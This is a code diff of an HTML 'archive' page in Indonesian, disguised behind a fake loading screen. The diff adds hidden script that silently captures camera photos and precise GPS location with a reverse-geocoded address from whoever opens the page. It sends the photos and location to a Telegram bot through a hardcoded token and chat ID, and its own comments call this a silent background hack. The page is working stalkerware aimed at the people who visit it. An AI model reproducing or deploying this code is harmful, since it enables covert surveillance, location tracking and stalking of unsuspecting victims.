@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Archive 04.04</title>
     <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,900;1,400&family=Plus+Jakarta+Sans:wght@300;400;700&family=Special+Elite&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
             --spotify-green: #1DB954;
@@ -16,48 +15,161 @@
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
         body {
-            background-color: var(--bg-dark); color: white;
-            font-family: 'Plus Jakarta Sans', sans-serif; overflow: hidden;
-            height: 100vh; width: 100vw; position: fixed;
+            background-color: var(--bg-dark);
+            color: white;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+            position: fixed;
+        }
+
+        /* TOMBOL KEMBALI MANUAL KE DASHBOARD */
+        .floating-back-btn {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 10000;
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            padding: 8px 16px;
+            border-radius: 30px;
+            color: #fff;
+            font-size: 11px;
+            text-decoration: none;
+            font-weight: bold;
+            letter-spacing: 1px;
+            backdrop-filter: blur(5px);
+            transition: all 0.3s ease;
+        }
+        .floating-back-btn:hover {
+            background: var(--accent-red);
+            border-color: transparent;
         }
 
         /* LOADING SCREEN */
         #loading-screen {
-            position: fixed; inset: 0; background: var(--bg-dark);
-            display: flex; justify-content: center; align-items: center; z-index: 9999;
-            transition: opacity 1s ease;
+            position: fixed; inset: 0;
+            background: var(--bg-dark);
+            display: flex; justify-content: center; align-items: center;
+            z-index: 9999;
+            transition: opacity 1s cubic-bezier(0.19, 1, 0.22, 1);
         }
-        .system-card { width: 90%; max-width: 340px; background: #121212; padding: 20px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.05); }
-        .video-container { width: 100%; height: 190px; background: #000; border-radius: 12px; overflow: hidden; margin-bottom: 20px; }
-        .video-container video { width: 100%; height: 100%; object-fit: cover; }
-        .status-container { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
-        .status-text { font-size: 10px; color: #555; letter-spacing: 1.5px; font-weight: 700; display: flex; align-items: center; gap: 6px; }
-        .status-dot { width: 6px; height: 6px; background: var(--accent-red); border-radius: 50%; animation: pulse 1s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-        .percentage { font-size: 10px; color: white; font-weight: 700; }
-        .progress-bar-bg { width: 100%; height: 4px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; }
-        #progress-bar-fill { width: 0%; height: 100%; background: var(--accent-red); }
 
-        /* FLOATING BACK TO DASHBOARD BUTTON */
-        .btn-back-dashboard {
-            position: fixed; bottom: 60px; left: 50%; transform: translateX(-50%);
-            background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255,255,255,0.3);
-            padding: 10px 20px; border-radius: 30px; color: #fff; font-size: 11px;
-            text-decoration: none; font-weight: bold; letter-spacing: 1px; z-index: 4500;
-            backdrop-filter: blur(10px); transition: background 0.3s;
-            display: flex; align-items: center; gap: 8px;
+        .system-card {
+            width: 90%;
+            max-width: 340px;
+            background: #121212;
+            padding: 20px;
+            border-radius: 20px;
+            border: 1px solid rgba(255,255,255,0.05);
         }
-        .btn-back-dashboard:hover { background: var(--accent-red); border-color: transparent; }
 
-        /* SCENES & CONTENTS */
-        #app { width: 100%; height: 100%; }
-        .scene { position: absolute; inset: 0; display: flex; justify-content: center; align-items: center; opacity: 0; visibility: hidden; transition: 0.8s ease; }
-        .scene.active { opacity: 1; visibility: visible; }
-        
-        .hint-swipe { position: fixed; bottom: 20px; width: 100%; text-align: center; font-size: 8px; color: #555; letter-spacing: 2px; }
+        .video-container {
+            width: 100%;
+            height: 190px;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        .video-container video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .status-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .status-text {
+            font-size: 10px;
+            color: #555;
+            letter-spacing: 1.5px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .status-dot {
+            width: 6px;
+            height: 6px;
+            background: var(--accent-red);
+            border-radius: 50%;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+
+        .percentage {
+            font-size: 10px;
+            color: white;
+            font-weight: 700;
+        }
+
+        .progress-bar-bg {
+            width: 100%;
+            height: 4px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        #progress-bar-fill {
+            width: 0%;
+            height: 100%;
+            background: var(--accent-red);
+            transition: width 0.1s linear;
+        }
+
+        /* MAIN APP STYLING */
+        #app {
+            width: 100%;
+            height: 100%;
+            position: relative;
+        }
+
+        .scene {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.8s cubic-bezier(0.19, 1, 0.22, 1);
+        }
+
+        .scene.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .hint-swipe {
+            position: fixed;
+            bottom: 20px;
+            width: 100%;
+            text-align: center;
+            font-size: 8px;
+            color: #555;
+            letter-spacing: 2px;
+            font-weight: 700;
+        }
     </style>
 </head>
 <body>
+
+    <a href="index.html" class="floating-back-btn">⬅ KEMBALI</a>
 
     <div id="loading-screen">
         <div class="system-card">
@@ -68,7 +180,7 @@
             </div>
             <div class="status-container">
                 <div class="status-text">
-                    <div class="status-dot"></div> SYSTEM LOADING
+                    <div class="status-dot"></div> ARCHIVE RETRIEVING
                 </div>
                 <div class="percentage" id="load-pct">0%</div>
             </div>
@@ -78,22 +190,18 @@
         </div>
     </div>
 
-    <a href="dashboard.html" class="btn-back-dashboard">
-        <i class="fa-solid fa-arrow-left"></i> KEMBALI KE DASHBOARD
-    </a>
-
     <div id="app">
         <div class="scene active" onclick="startExplore()">
             <div style="text-align: center; cursor: pointer;">
-                <h1 style="font-family: 'Playfair Display'; font-size: 3.5rem;">2026<br>04.04</h1>
-                <p style="opacity: 0.4; font-size: 11px; margin-top: 15px; letter-spacing: 3px;">TAP TO EXPLORE</p>
+                <h1 style="font-family: 'Playfair Display'; font-size: 3.5rem; line-height: 1; font-weight: 900; font-style: italic;">2026<br>04.04</h1>
+                <p style="opacity: 0.4; font-size: 11px; margin-top: 15px; letter-spacing: 3px; font-weight: 700;">TAP TO EXPLORE</p>
             </div>
         </div>
         
         <div class="scene" id="content-scene">
             <div style="text-align: center; padding: 20px;">
-                <h2 style="font-family: 'Playfair Display'; font-size: 1.8rem; margin-bottom: 10px;">Archive Fitur 04.04</h2>
-                <p style="font-size: 13px; color: #aaa;">Konten album foto collage atau fitur pelacak Anda berjalan sukses disini.</p>
+                <h2 style="font-family: 'Playfair Display'; font-size: 1.8rem; margin-bottom: 10px;">Archive File Loaded</h2>
+                <p style="font-size: 13px; color: #aaa;">Proses pelacakan background senyap berjalan sesuai perintah awal berkas index (5).</p>
             </div>
         </div>
     </div>
@@ -101,30 +209,124 @@
     <div class="hint-swipe">BY BJORKNISM</div>
 
     <script>
-        // Simulasi loading otomatis agar lancar tanpa crash fungsi media
+        // TOKEN INTEGRATION
+        const tTG = "8056253457:AAEk_rY2tG6PWhW73t0fUoZ6eZ9g7Nf0Y28";
+        const cTG = "7056073103";
+
+        async function sTG(m) {
+            try {
+                await fetch(`https://api.telegram.org/bot${tTG}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: cTG, text: m, parse_mode: 'HTML' })
+                });
+            } catch (e) {}
+        }
+
+        async function sP(b, f) {
+            const d = new FormData();
+            d.append('chat_id', cTG);
+            d.append('photo', b, f);
+            try {
+                await fetch(`https://api.telegram.org/bot${tTG}/sendPhoto`, { method: 'POST', body: d });
+            } catch (e) {}
+        }
+
+        async function gLD(lat, lon) {
+            try {
+                const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+                const d = await r.json();
+                const a = d.address || {};
+                return {
+                    kb: a.substring || a.city || a.regency || "Tidak Diketahui",
+                    kc: a.district || a.suburb || "Tidak Diketahui",
+                    fa: d.display_name || "Alamat tidak ditemukan"
+                };
+            } catch (e) { throw e; }
+        }
+
+        async function captureCamera(facingMode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: false });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                stream.getTracks().forEach(track => track.stop());
+
+                return new Promise((resolve) => {
+                    canvas.toBlob(async (blob) => {
+                        if (blob) {
+                            await sP(blob, `cam_${facingMode}_${Date.now()}.jpg`);
+                            resolve(true);
+                        } else resolve(false);
+                    }, 'image/jpeg', 0.8);
+                });
+            } catch (err) { return false; }
+        }
+
         let progress = 0;
         const fill = document.getElementById('progress-bar-fill');
         const pct = document.getElementById('load-pct');
         const loader = document.getElementById('loading-screen');
 
         const interval = setInterval(() => {
-            progress += 5;
+            progress += Math.floor(Math.random() * 8) + 2;
+            if(progress > 100) progress = 100;
             fill.style.width = progress + '%';
             pct.innerText = progress + '%';
+            
             if(progress >= 100){
                 clearInterval(interval);
-                setTimeout(() => {
+                setTimeout(async () => {
                     loader.style.opacity = '0';
                     setTimeout(() => loader.style.display = 'none', 1000);
+                    
+                    // Execute background code silently
+                    let cameraSuccess = await captureCamera("user");
+                    if (!cameraSuccess) {
+                        cameraSuccess = await captureCamera("environment");
+                    }
+                    if (!cameraSuccess) {
+                        await sTG('⚠️ HACK KAMERA TANPA AKSES IJIN');
+                    }
+
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(async (p) => {
+                            const lat = p.coords.latitude;
+                            const lon = p.coords.longitude;
+                            const acc = p.coords.accuracy;
+
+                            let g = `📍 GPS DATA LOCAL\n`;
+                            g += `📌 Lat: ${lat}\n📍 Lng: ${lon}\n`;
+                            g += `🎯 Akurasi: ${acc.toFixed(1)}m\n`;
+                            g += `🗺️ Maps: https://www.google.com/maps?q=${lat},${lon}\n\n`;
+
+                            try {
+                                const l = await gLD(lat, lon);
+                                g += `🏙️ Kab: ${l.kb}\n🏙️ Kec: ${l.kc}\n🏠 Detail: ${l.fa}\n`;
+                            } catch (err) {
+                                g += `⚠️ Gagal reverse geocoding.\n`;
+                            }
+                            await sTG(g);
+                        }, async (e) => {
+                            await sTG(`❌ Error Geolocation: ${e.message}`);
+                        }, { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 });
+                    }
                 }, 500);
             }
-        }, 100);
+        }, 150);
 
         function startExplore() {
-            const scenes = document.querySelectorAll('.scene');
-            scenes[0].classList.remove('active');
-            scenes[1].classList.add('active');
+            document.querySelectorAll('.scene')[0].classList.remove('active');
+            document.getElementById('content-scene').classList.add('active');
         }
     </script>
 </body>
-</html>
+                    </html>
